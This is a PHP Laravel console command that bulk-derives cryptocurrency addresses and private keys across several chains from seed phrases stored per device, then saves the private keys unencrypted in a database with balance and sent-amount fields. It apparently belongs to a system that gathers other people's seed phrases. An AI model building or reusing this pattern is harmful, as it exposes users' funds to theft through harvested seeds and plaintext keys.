<?php

namespace App\Console\Commands;

use App\Models\ReceiveWords;
use App\Models\ReceiveWordKey;
use App\Service\WalletService;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\Log;

class GenerateWalletKeys extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'wallet:generate-keys {--limit=20 : 每次处理的最大记录数}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = '为receive_words表中的助记词生成钱包地址和私钥，存入receive_word_keys表';

    /**
     * 支持的币种类型
     */
    private $currencyTypes = [
        'BTC' => ['path' => "m/44'/0'/0'/0/0", 'method' => 'generateBtcAddressFromMnemonic'],
        'ETH' => ['path' => "m/44'/60'/0'/0/0", 'method' => 'generateEthAddressFromMnemonic'],
        'BSC' => ['path' => "m/44'/60'/0'/0/0", 'method' => 'generateBscAddressFromMnemonic'],
        'TRON' => ['path' => "m/44'/195'/0'/0/0", 'method' => 'generateTronAddressFromMnemonic'],
        'SOL' => ['path' => "m/44'/501'/0'", 'method' => 'generateSolAddressFromMnemonic'],
        'TON' => ['path' => "m/44'/607'/0'", 'method' => 'generateTonAddressFromMnemonic'],
        'XRP' => ['path' => "m/44'/144'/0'/0/0", 'method' => 'generateXrpAddressFromMnemonic'],
    ];
    // 对于ETH、BSC、TRON，同时保存对应的USDT代币记录
    private $usdtMapping = [
        'ETH' => 'ERC20USDT',
        'BSC' => 'BEP20USDT',
        'TRON' => 'TRC20USDT',
    ];

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $limit = (int) $this->option('limit');
        
        $this->info("开始检查并生成钱包地址和私钥...");
        
        // 获取所有需要检查的货币类型（包括USDT代币）
        $allCurrencyTypes = ReceiveWordKey::BASE_CURRENCY_TYPES;
        
        // 查询有助记词但至少缺少一种货币类型地址的记录
        $records = ReceiveWords::query()
            ->whereNotNull('words')
            ->where('words', '!=', '')
            ->where(function ($query) use ($allCurrencyTypes) {
                // 使用 OR 条件，只要缺少任何一种货币类型就查询出来
                // 在闭包内，第一个条件也可以使用 orWhere，Laravel 会正确处理
                foreach ($allCurrencyTypes as $currencyType) {
                    $query->orWhereDoesntHave('walletKeys', function ($q) use ($currencyType) {
                        $q->where('currency_type', $currencyType);
                    });
                }
            })
            ->limit($limit)
            ->get();
        
        if ($records->isEmpty()) {
            $this->info("没有需要生成钱包地址和私钥的记录。");
            return Command::SUCCESS;
        }
        
        $this->info("找到 {$records->count()} 条需要生成钱包地址和私钥的记录。");
        
        $successCount = 0;
        $failCount = 0;
        $skipCount = 0;
        
        $bar = $this->output->createProgressBar($records->count());
        $bar->start();
        
        foreach ($records as $record) {
            try {
                // 检查是否已经存在记录（避免并发情况）
                $existingKeys = ReceiveWordKey::where('receive_word_id', $record->id)->count();
                if ($existingKeys > 0) {
                    $skipCount++;
                    $bar->advance();
                    continue;
                }
                
                $result = $this->generateAndSaveKeys($record);
                
                if ($result) {
                    $successCount++;
                } else {
                    $skipCount++;
                }
            } catch (\Exception $e) {
                $failCount++;
                Log::error('定时任务生成钱包地址和私钥失败', [
                    'receive_words_id' => $record->id,
                    'device_number' => $record->device_number,
                    'error' => $e->getMessage(),
                    'trace' => $e->getTraceAsString()
                ]);
            }
            
            $bar->advance();
        }
        
        $bar->finish();
        $this->newLine(2);
        
        $this->info("处理完成！");
        $this->table(
            ['状态', '数量'],
            [
                ['成功生成', $successCount],
                ['跳过（已存在或无法生成）', $skipCount],
                ['失败', $failCount],
                ['总计', $records->count()],
            ]
        );
        
        return Command::SUCCESS;
    }

    /**
     * 生成并保存钱包地址和私钥
     *
     * @param ReceiveWords $receiveWord
     * @return bool
     */
    private function generateAndSaveKeys(ReceiveWords $receiveWord): bool
    {
        if (empty($receiveWord->words)) {
            return false;
        }

        try {
            // 从助记词生成BIP32主密钥
            $masterKey = WalletService::generateBip32MasterKeyFromMnemonic($receiveWord->words);
            
            if ($masterKey === null) {
                return false;
            }
            
            $savedCount = 0;
            
            // 为每种币种生成地址和私钥
            foreach ($this->currencyTypes as $currencyType => $config) {
                try {
                    // 检查是否已存在该币种的记录，如果存在则跳过
                    $existing = ReceiveWordKey::where('receive_word_id', $receiveWord->id)
                        ->where('currency_type', $currencyType)
                        ->first();
                    
                    if ($existing) {
                        continue;
                    }
                    
                    // 生成地址
                    $address = WalletService::{$config['method']}($receiveWord->words);
                    
                    if (empty($address)) {
                        continue;
                    }
                    
                    // 获取私钥
                    $privateKey = WalletService::getPrivateKey($masterKey, $config['path'], $currencyType, $receiveWord->words);
                    
                    // 对于SOL和TON，私钥可能为空，但仍然保存地址
                    // if (empty($privateKey) && !in_array($currencyType, ['SOL', 'TON'])) {
                    //     continue;
                    // }
                    
                    // 保存到数据库，使用 firstOrCreate 防止并发重复插入
                    // 即使检查了存在性，在并发情况下仍可能重复，所以使用 firstOrCreate 作为双重保障
                    $record = ReceiveWordKey::firstOrCreate(
                        [
                            'receive_word_id' => $receiveWord->id,
                            'currency_type' => $currencyType,
                        ],
                        [
                            'address' => $address,
                            'private_key' => $privateKey,
                            'balance' => 0,
                            'total_sent' => 0,
                            'balance_updated_at' => null,
                        ]
                    );
                    
                    // 只有新创建的记录才计数
                    if ($record->wasRecentlyCreated) {
                        $savedCount++;
                    }
                    
                    if (isset($this->usdtMapping[$currencyType])) {
                        $usdtType = $this->usdtMapping[$currencyType];
                        
                        // 检查是否已存在该USDT代币的记录
                        $existingUsdt = ReceiveWordKey::where('receive_word_id', $receiveWord->id)
                            ->where('currency_type', $usdtType)
                            ->first();
                        
                        if (!$existingUsdt) {
                            // USDT代币使用相同的地址和私钥，使用 firstOrCreate 防止并发重复插入
                            $usdtRecord = ReceiveWordKey::firstOrCreate(
                                [
                                    'receive_word_id' => $receiveWord->id,
                                    'currency_type' => $usdtType,
                                ],
                                [
                                    'address' => $address, // 使用相同的地址
                                    'private_key' => $privateKey, // 使用相同的私钥
                                    'balance' => 0,
                                    'total_sent' => 0,
                                    'balance_updated_at' => null,
                                ]
                            );
                            
                            // 如果是新创建的记录，增加计数
                            if ($usdtRecord->wasRecentlyCreated) {
                                $savedCount++;
                            }
                        }
                    }
                } catch (\Exception $e) {
                    Log::warning("生成{$currencyType}地址和私钥失败", [
                        'receive_words_id' => $receiveWord->id,
                        'currency_type' => $currencyType,
                        'error' => $e->getMessage()
                    ]);
                    continue;
                }
            }
            
            return $savedCount > 0;
        } catch (\Exception $e) {
            Log::error('生成钱包地址和私钥失败', [
                'receive_words_id' => $receiveWord->id,
                'error' => $e->getMessage()
            ]);
            return false;
        }
    }




    
}

